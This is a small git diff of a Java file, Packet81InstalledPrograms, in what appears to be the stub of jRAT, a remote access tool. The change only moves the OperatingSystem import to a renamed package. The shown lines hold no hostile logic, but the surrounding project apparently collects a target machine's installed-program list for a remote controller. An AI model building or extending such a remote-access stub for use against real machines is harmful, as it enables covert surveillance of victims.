@@ -4,10 +4,10 @@ import java.io.BufferedReader;
 import java.io.File;
 import java.io.InputStreamReader;
 
+import pro.jrat.common.OperatingSystem;
 import pro.jrat.stub.Connection;
 import pro.jrat.stub.packets.outgoing.Packet55InstalledProgram;
 
-import com.redpois0n.common.OperatingSystem;
 
 
 public class Packet81InstalledPrograms extends AbstractIncomingPacket {
